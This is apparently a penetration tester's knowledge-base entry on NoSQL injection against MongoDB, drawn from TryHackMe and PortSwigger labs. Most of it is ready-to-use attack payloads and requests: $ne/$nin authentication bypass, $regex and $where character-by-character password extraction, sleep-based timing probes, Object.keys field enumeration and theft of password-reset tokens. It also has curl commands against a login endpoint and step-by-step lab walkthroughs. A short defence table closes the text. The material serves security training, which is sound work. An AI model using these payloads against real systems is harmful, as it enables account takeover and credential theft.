---
title: "NoSQL Injection"
type: technique
tags: [database, exploitation, injection, mongodb, thm, web]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-05-13
sources: [thm-nosql-injection, payloadsallthethings-nosqli, git-portswigger-all-labs]
---

# NoSQL Injection

## What it is

NoSQL injection is an injection attack against non-relational databases (primarily MongoDB) that allows an attacker to manipulate database queries by injecting malicious operators or breaking out of query syntax, enabling authentication bypass and data exfiltration without using SQL.

## How it works

Unlike SQL injection where string concatenation allows breaking out of quoted values, NoSQL injection exploits two distinct mechanisms:

1. **Operator Injection** — Many server-side languages allow passing array/object structures via HTTP parameters (e.g., `user[$ne]=x`). When these are used directly as query filters, an attacker can inject MongoDB query operators (`$ne`, `$gt`, `$regex`, `$nin`, `$where`) to alter query logic without ever escaping a string.

2. **Syntax Injection** — When developers use `$where` with a JavaScript string constructed by concatenation (e.g., `{"$where": "this.username == '" + username + "'"}`), an attacker can break out with `'` and inject JavaScript logic — analogous to classic SQL injection.

**MongoDB filter structure:**
```javascript
// Normal authentication query
{ username: "alice", password: "s3cr3t" }

// After operator injection
{ username: { $ne: "xxxx" }, password: { $ne: "yyyy" } }
// Returns ALL documents — authentication bypassed
```

## Prerequisites

- Application constructs MongoDB queries using unsanitised user input
- Server-side language accepts array parameters from HTTP requests (PHP, Node.js, etc.)
- For operator injection: no type-checking on input fields (accepts objects, not just strings)
- For syntax injection: developer uses `$where` with JavaScript string concatenation
- For password extraction via `$regex`: login returns distinct success/failure responses

## Methodology

### 1. Identify injection points

**Fuzz with special character strings** to find syntax sensitivity:
```
'"`{;$Foo}$Foo \xYZ
'\"`{\r;$Foo}\n$Foo \\xYZ
```
URL-encoded for GET parameters:
```
?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

Submit a single quote `'` into string fields and observe for:
- Python/Node.js stack traces mentioning MongoDB
- Errors referencing `$where` or `find()`
- Any distinct error vs. normal response (e.g., "There was an error getting user details")

**Verify with string concatenation** — if `'+'` (URL-encoded `%27%2B%27`) returns a normal response where `'` caused an error, the single quote was breaking the query syntax.

Test for boolean-based differences:
```
admin' && 0 && 'x   →  no result (false condition)
admin' && 1 && 'x   →  returns result (true condition)
```

Also test equality-based conditions:
```
admin' && '1'=='2    →  false, no result ("Could not find user")
admin' && '1'=='1    →  true, returns result
```

### 2. Operator injection — authentication bypass

In a typical PHP/Node login form, change POST body to pass arrays:

**Original request:**
```
POST /login HTTP/1.1
username=admin&password=wrongpass
```

**Injected request — bypass with `$ne` (not equal):**
```
POST /login HTTP/1.1
username[$ne]=xxxxxxx&password[$ne]=yyyyyyy
```

This creates the MongoDB filter `{ username: {$ne:"xxxxxxx"}, password: {$ne:"yyyyyyy"} }` which matches every document — logs in as the first user returned.

**Target specific known accounts with `$in`:**
```json
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

**Note:** If URL-encoded array notation (`username[$ne]=x`) is rejected or fails, switch the request to `Content-Type: application/json` and inject operators directly in the JSON body.

### 3. Log in as specific users with `$nin`

Use `$nin` (not in list) to exclude known accounts and cycle through all users:

```
username[$nin][]=admin&password[$ne]=x
```
Filter: `{ username: {$nin:["admin"]}, password: {$ne:"x"} }` — logs in as the next user.

Add more exclusions iteratively:
```
username[$nin][]=admin&username[$nin][]=alice&password[$ne]=x
```

Continue until "invalid user/password" — all accounts enumerated.

### 4. Extract passwords with `$regex`

Once you can log in as a specific user, use regex matching to recover the plaintext password character by character (similar to time-based blind SQLi, but response-based):

**Step 1 — Determine password length:**
```
username=admin&password[$regex]=^.{5}$
```
Increment the number until login succeeds (e.g., length = 5).

**Step 2 — Brute-force each character position:**
```
username=admin&password[$regex]=^a....$ 
username=admin&password[$regex]=^b....$
...
```
Success response reveals first character. Repeat for each position:
```
username=admin&password[$regex]=^ad...$
username=admin&password[$regex]=^adm..$
...
```

### 5. Syntax injection exploitation

When `$where` is used with string concatenation:

```python
# Vulnerable query
mycol.find({"$where": "this.username == '" + username + "'"})
```

**Dump all records (always-true condition):**
```
username: admin'||1||'
```
This evaluates as JavaScript `this.username == 'admin' || 1 || ''` — always true — returns all documents.

**Test with boolean conditions:**
```
admin' && 0 && 'x    →  false, no result
admin' && 1 && 'x    →  true, returns admin document
```

**Null character truncation** — if the query appends additional conditions (e.g., `&& this.released == 1`), inject a null byte to truncate:
```
GET /product/lookup?category=fizzy'%00
```
MongoDB may ignore everything after the null byte, bypassing the trailing condition.

### 6. Blind data extraction via $where character indexing

When you have a confirmed `$where` injection in a GET/lookup endpoint, extract field values character by character:

**Step 1 — Confirm the field exists:**
```
admin' && this.password!=''    →  result returned (field exists)
admin' && this.foo!=''         →  no result (field absent)
```

**Step 2 — Determine length:**
```
administrator' && this.password.length < 30 || 'a'=='b
administrator' && this.password.length < 6  || 'a'=='b
```
Binary-search the boundary — when the response switches from success to failure, you have the exact length.

**Step 3 — Extract each character by index:**
```
admin' && this.password[0] == 'a' || 'a'=='b
admin' && this.password[0] == 'b' || 'a'=='b
```
Repeat for each position 0–N. Automate with Burp Intruder (Cluster Bomb): payload 1 = position (0–N), payload 2 = character set (a–z, A–Z, 0–9).

**Alternative: `match()` with regex pattern:**
```
admin' && this.password.match(/\d/) || 'a'=='b
```
Checks if any character is a digit — useful for narrowing the character set.

### 7. Unknown field enumeration via Object.keys()

When the application has operator injection with `$where` support, discover hidden field names without guessing:

```json
{"username":"carlos","password":{"$ne":"invalid"},"$where":"Object.keys(this)[0].match('^.{0}i.*')"}
```

Template for Burp Intruder (Cluster Bomb):
- Payload position 1: `{§§}` — integer 0–20 (character position)
- Payload position 2: `§§` — character set a–z, A–Z, 0–9

```json
"$where":"Object.keys(this)[§INDEX§].match('^.{§POS§}§CHAR§.*')"
```

Iterate `INDEX` (0, 1, 2, 3...) to enumerate each field name. Sort results by Payload1 + Length to reconstruct names.

Example field discovery order: `_id` → `username` → `password` → `newpwdTkn`

**Using extracted field names:** once you find a hidden field (e.g., `pwResetTkn`), brute-force its value the same way:
```
GET /forgot-password?pwResetTkn=<bruteforced-value>
```

## Key payloads / examples

### Operator injection payloads (PHP array notation)

```
# Auth bypass — not equal
user[$ne]=x&pass[$ne]=x

# Not in list — enumerate users
user[$nin][]=admin&pass[$ne]=x
user[$nin][]=admin&user[$nin][]=alice&pass[$ne]=x

# Greater than (also bypasses some filters)
user[$gt]=&pass[$gt]=

# Regex — password brute force
user=admin&pass[$regex]=^.{5}$
user=admin&pass[$regex]=^a....$
```

### JSON body injection (Node.js / Express)

```json
{
  "username": {"$ne": "xxxx"},
  "password": {"$ne": "yyyy"}
}
```

```json
{
  "username": {"$nin": ["admin"]},
  "password": {"$ne": "yyyy"}
}
```

```json
{
  "username": "admin",
  "password": {"$regex": "^a...."}
}
```

### Syntax injection ($where context)

```javascript
// True condition — dump all
admin'||1||'

// Boolean test
admin' && 0 && 'x    // false
admin' && 1 && 'x    // true

// Equality-based boolean (GET parameter style)
admin' && '1'=='1    // true
admin' && '1'=='2    // false

// Null byte query truncation (bypass trailing conditions)
fizzy'%00

// Field existence probe
admin' && this.password!=''    // true if field exists
admin' && this.foo!=''         // false if field absent

// Password length probe
administrator' && this.password.length < 30 || 'a'=='b

// Character-by-character extraction (char index)
admin' && this.password[0] == 'a' || 'a'=='b
admin' && this.password[1] == 'b' || 'a'=='b
```

### Unknown field enumeration ($where + Object.keys)

```json
{"username":"carlos","password":{"$ne":"invalid"},"$where":"Object.keys(this)[0].match('^.{0}i.*')"}
```

Burp Intruder Cluster Bomb template (enumerate field name at array index N):
```
"$where":"Object.keys(this)[§N§].match('^.{§POS§}§CHAR§.*')"
```

Password reset token extraction from discovered field:
```json
{"username":"carlos","password":{"$ne":"invalid"},"$where":"this.pwResetTkn.match('^.{§POS§}§CHAR§.*')"}
```

### Timing-based blind ($where + sleep)

```json
{"$where":"sleep(5000)"}
```

Conditional timing — confirm password character with 5-second delay:
```javascript
// Via $where string injection
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'

// Alternative
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```

### MongoDB operator reference

| Operator | Meaning | Injection use |
|----------|---------|---------------|
| `$ne` | Not equal | Bypass: match any doc where field != supplied value |
| `$gt` | Greater than | Bypass: empty string is > nothing |
| `$lt` | Less than | Filter bypass |
| `$nin` | Not in array | Enumerate users by exclusion |
| `$regex` | Regex match | Blind password extraction |
| `$where` | JavaScript expression | Syntax injection when string concatenated |

## Bypasses and variants

**Type confusion / accepting objects where strings expected:** most operator injection works because the server reads `$_POST['user']` without verifying it's a string, so passing `user[$ne]=x` creates `$_POST['user'] = ["$ne" => "x"]` which PHP passes as an array, and the MongoDB driver interprets it as an operator object.

**JSON content-type injection:** if the app accepts `Content-Type: application/json`, operators can be injected directly as JSON objects without array notation.

**Duplicate Keys (WAF Bypass):** In MongoDB, if a JSON document contains duplicate keys, only the last occurrence of the key will take precedence. This can bypass WAFs that only inspect the first occurrence of a parameter.
```json
{"id":"10", "id":"100"} 
```

**Blind operator injection (no response difference):** use `$where` with `sleep()` for timing-based confirmation. Establish baseline response time first, then inject `{"$where":"sleep(5000)"}` — a 5-second delay confirms JavaScript execution. For character extraction without visible differences, combine with function-based payloads that sleep only when the character matches.

**Locked account workaround:** if the target account is locked (common in lab/CTF scenarios where brute-forcing triggers lockout), use the `$where` + `Object.keys()` approach to exfiltrate a password reset token from the database, then use it directly via the forgot-password endpoint — bypassing the login entirely.

## Detection and defence

| Defence | Detail |
|---------|--------|
| **Input type enforcement** | Explicitly check that username/password inputs are strings, not arrays or objects, before using in queries |
| **Avoid `$where` with concatenation** | Use built-in filter functions (`{username: user}`) instead of JavaScript strings |
| **Parameterised / sanitised query builders** | Use ODM libraries (Mongoose, etc.) with schema validation to enforce types |
| **Allowlist input characters** | Reject `$`, `[`, `{` in authentication field inputs |
| **Disable JavaScript in MongoDB** | Set `--noscripting` or `security.javascriptEnabled: false` to remove `$where` capability |
| **Least privilege** | The MongoDB user used by the application should only have read access to required collections |

## Tools

- [[burp-suite]] — intercept and modify POST body; switch between URL-encoded and JSON content types
- `curl` for quick operator injection tests:

```bash
# Test $ne bypass via URL-encoded POST
curl -X POST http://target/login \
  -d "username[$ne]=x&password[$ne]=y"

# Test with JSON content type
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":"x"},"password":{"$ne":"y"}}'
```

## PortSwigger Labs

### Lab 1 — Detecting NoSQL injection (Apprentice)

Goal: confirm injection in a `category` GET parameter and display unreleased products.

1. In Burp Repeater, inject `'` (URL-encoded `%27`) into the `category` parameter — observe a syntax error response.
2. Inject `'+'` (`%27%2B%27`) — no error, confirms the quote was breaking the query.
3. Boolean false: `' && 0 && 'x` (`%27%20%26%26%200%20%26%26%20%27x`) — no results (condition false).
4. Boolean true: `' && 1 && 'x` (`%27%20%26%26%201%20%26%26%20%27x`) — normal results (condition true).
5. OR bypass: `' || 1 || '` (`%27%20%7C%7C%201%20%7C%7C%20%27`) — returns ALL products including unreleased.

Key payload:
```
GET /product/lookup?category='%20%7C%7C%201%20%7C%7C%20'
```

---

### Lab 2 — Exploiting NoSQL operator injection to bypass authentication (Apprentice)

Goal: log in as `administrator` without knowing the password.

1. Intercept the JSON login request in Burp Suite.
2. Confirm operator injection with a known account:
```json
{"username":{"$regex":"wie.*"},"password":{"$ne":""}}
```
3. Log in as admin using `$regex` to match the username:
```json
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```
Or use exact match with `$ne` on password:
```json
{"username":"administrator","password":{"$ne":"invalid"}}
```
4. Forward the redirected response in the original browser session to solve the lab.

**Note:** This lab uses a POST JSON login endpoint — operator injection works because the server accepts object values for username/password fields without type-checking.

---

### Lab 3 — Exploiting NoSQL injection to extract data (Practitioner)

Goal: extract the `administrator` account password via blind `$where` injection in a GET lookup endpoint (`/user/lookup?user=`).

1. Confirm injection: inject `'` — error response; inject `'+'` — normal response.
2. Boolean false: `' && '1'=='2` → "Could not find user".
3. Boolean true: `' && '1'=='1` → valid user data returned.
4. Switch to `administrator` target with always-true condition:
```
?user=administrator' && '1'=='1
```
5. Find password length by binary-searching `this.password.length`:
```
administrator' && this.password.length < 30 || 'a'=='b
administrator' && this.password.length < 6  || 'a'=='b
```
6. Extract each character using index access (Burp Intruder Cluster Bomb):
```
administrator' && this.password[§POS§]=='§CHAR§' || 'a'=='b
```
- Payload 1: integers 0–7 (password positions)
- Payload 2: a–z character set
- Success = response length differs (user data returned)

---

### Lab 4 — Exploiting NoSQL operator injection to extract unknown fields (Practitioner)

Goal: log in as `carlos` who has a locked account — extract a hidden password reset token from the database.

1. Confirm operator injection with known account:
```json
{"username":"wiener","password":{"$ne":"invalid"}}
```
2. Attempt same for `carlos` — receive "Account locked: please reset password".
3. Confirm `$where` JavaScript execution via timing:
```json
{"username":"carlos","password":{"$ne":"invalid"},"$where":"sleep(5000)"}
```
Server delays 5 seconds — `$where` is evaluated.
4. Enumerate field names with `Object.keys(this)[N]` (Cluster Bomb, index 0–3):
```json
{"username":"carlos","password":{"$ne":"invalid"},"$where":"Object.keys(this)[§N§].match('^.{§POS§}§CHAR§.*')"}
```
Discovered fields (in order): `_id`, `username`, `password`, `newpwdTkn`
5. **Before brute-forcing `newpwdTkn`:** trigger a password reset for `carlos` so the token is populated (otherwise the field reference causes a 500 error).
6. Extract token value character by character:
```json
{"username":"carlos","password":{"$ne":"invalid"},"$where":"this.pwResetTkn.match('^.{§POS§}§CHAR§.*')"}
```
7. Use the recovered 16-character token directly:
```
GET /forgot-password?pwResetTkn=<extracted-token>
```
8. Set a new password and log in as `carlos`.

---

## Sources

| Source | Content covered |
|--------|----------------|
| THM NoSQL Injection | MongoDB document model, operator injection, `$ne`/`$nin`/`$regex` attacks, auth bypass, password extraction, `$where` syntax injection |
| PortSwigger All Labs (git) | Fuzz string detection, null byte truncation, OR bypass for unreleased products, `$regex` auth bypass, blind `$where` char-index extraction, `Object.keys()` field enumeration, timing-based blind via `sleep()`, locked-account token exfil workflow |

## From the Wild

### HTB — Stocker (2023)
- **Technique variant**: NoSQL Injection + PDF HTML Injection
- **Attack path**: NoSQL injection to bypass Express.js login, HTML injection in PDF generator reads files via iframe, path wildcard sudo for root

### HTB — Shoppy (2022)
- **Technique variant**: NoSQL Injection + Docker Group
- **Attack path**: NoSQL injection in login and search, crack user hash from Mattermost, docker group container escape for root

### HTB — NodeBlog (2022)
- **Technique variant**: NoSQL Injection + XXE + Deserialization
- **Attack path**: NoSQL injection to bypass login, XXE in blog XML parsing, node-serialize deserialization RCE, MongoDB creds for root

### HTB — Mango (2019)
- **Technique variant**: NoSQL Injection, SSH Credential Reuse, jjs SUID
- **Attack path**: NoSQL regex injection to dump creds, SSH lateral movement, Java jjs SUID for root
